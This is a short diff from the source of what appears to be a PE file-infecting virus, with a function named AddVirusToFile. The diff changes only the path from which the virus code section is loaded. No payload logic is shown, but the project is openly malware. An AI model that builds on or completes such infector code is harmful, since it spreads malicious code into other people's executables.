@@ -40,7 +40,7 @@ void WINAPI AddVirusToFile(PVOID file_data, DWORD file_size, PDATA data, LPDWORD
 
 int main()
 {
-    std::string virus_path = "E:\\Code\\Github\\PE-Injection-Virus\\virus_code_section";
+    std::string virus_path = "file\\virusbody\\virus_code_section";
     std::filesystem::path p{virus_path};
     section_data_global.resize(std::filesystem::file_size(p));
     std::ifstream ifs32(virus_path, std::ios_base::binary);
